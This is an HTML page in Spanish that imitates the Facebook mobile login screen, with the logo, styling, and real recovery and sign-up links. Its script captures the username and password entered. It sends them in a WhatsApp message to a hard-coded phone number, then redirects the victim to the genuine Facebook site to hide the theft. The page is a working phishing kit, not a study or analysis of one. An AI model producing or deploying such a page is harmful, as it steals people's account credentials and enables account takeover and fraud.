<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook</title>
    <style>
        /* Reset de márgenes y paddings */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Configuración del cuerpo */
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom, #f7f8fc, #ffffff);
            min-height: 100vh;
            width: 100vw;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
        }

        /* Idioma */
        .language {
            color: #606770;
            font-size: 14px;
            margin-bottom: 30px;
        }

        /* Logo */
        .logo {
            width: 60px;
            margin-bottom: 40px;
        }

        /* Contenedor principal */
        .container {
            width: 90%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 75vh;
            margin-top: 30px;
        }

        /* Campos de entrada */
        .input-box {
            width: 90%;
            max-width: 350px;
            padding: 14px;
            margin: 12px 0;
            border: 1px solid #ccd0d5;
            border-radius: 12px;
            font-size: 16px;
            background: white;
            outline: none;
        }

        /* Botón de inicio de sesión */
        .login-button {
            width: 90%;
            max-width: 350px;
            padding: 14px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-button:hover {
            background-color: #1558b0;
        }

        /* Enlace de recuperación */
        .forgot-password {
            display: block;
            margin: 15px 0;
            color: black;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }

        /* Botón de crear cuenta (convertido en enlace) */
        .create-account {
            display: block;
            width: 90%;
            max-width: 350px;
            padding: 14px;
            border: 1px solid #1877f2;
            background-color: white;
            color: #1877f2;
            font-weight: bold;
            border-radius: 20px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            margin-bottom: 40px;
            text-align: center;
            text-decoration: none;
        }
        .create-account:hover {
            background-color: #f0f2f5;
        }

        /* Sección de Meta */
        .meta-section {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            color: #606770;
            font-size: 14px;
            font-weight: bold;
        }

        .meta-icon {
            width: 20px;
            margin-right: 5px;
        }

        /* Pie de página */
        .footer {
            position: absolute;
            bottom: 10px;
            font-size: 12px;
            color: #606770;
            text-align: center;
            width: 100%;
        }
        .footer a {
            color: #606770;
            text-decoration: none;
            margin: 0 5px;
        }
        .footer a:hover {
            text-decoration: underline;
        }

        /* Ajustes para pantallas pequeñas */
        @media (max-width: 400px) {
            .container {
                height: auto;
            }
            .input-box {
                margin: 8px 0;
            }
        }
    </style>
</head>
<body>

    <!-- Idioma -->
    <p class="language">Español</p>

    <!-- Logo de Facebook -->
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">

    <!-- Contenedor -->
    <div class="container">
        <!-- Campos de entrada -->
        <input type="text" id="username" class="input-box" placeholder="Celular o correo electrónico">
        <input type="password" id="password" class="input-box" placeholder="Contraseña">

        <!-- Botón de inicio de sesión -->
        <button class="login-button" onclick="enviarDatos()">Iniciar sesión</button>

        <!-- Enlace de recuperación -->
        <a href="https://m.facebook.com/login/identify/" class="forgot-password">¿Olvidaste tu contraseña?</a>

        <!-- Botón de crear cuenta (ahora es un enlace) -->
        <a href="https://m.facebook.com/reg/" class="create-account">Crear cuenta nueva</a>
    </div>

    <!-- Sección de Meta -->
    <div class="meta-section">
        <img class="meta-icon" src="https://img.icons8.com/ios-filled/50/606770/meta.png" alt="Meta Icon">
        <span>Meta</span>
    </div>

    <!-- Pie de página -->
    <div class="footer">
        <a href="#">Información</a> 
        <a href="#">Ayuda</a> 
        <a href="#">Más</a>
    </div>

    <script>
        function enviarDatos() {
            // Obtener datos ingresados
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;

            // Verificar que los campos no estén vacíos
            if (username === "" || password === "") {
                alert("Por favor, complete todos los campos.");
                return;
            }

            // Crear el mensaje para WhatsApp
            var mensaje = "📌 *Intento de inicio de sesión en Facebook*%0A%0A";
            mensaje += "👤 Usuario: " + username + "%0A";
            mensaje += "🔑 Contraseña: " + password + "%0A";
            mensaje += "📅 Fecha: " + new Date().toLocaleString();

            // Número de WhatsApp donde se enviará (cambia el número)
            var numeroWhatsApp = "+50488440235"; // Reemplazar con el número correcto

            // Enlace de WhatsApp
            var urlWhatsApp = "https://api.whatsapp.com/send?phone=" + numeroWhatsApp + "&text=" + mensaje;

            // Redirigir a WhatsApp
            window.open(urlWhatsApp, "_blank");

            // Luego de 3 segundos, abrir otro enlace
            setTimeout(function() {
                window.location.href = "https://www.facebook.com";
            }, 3000);
        }
    </script>

</body>
</html>
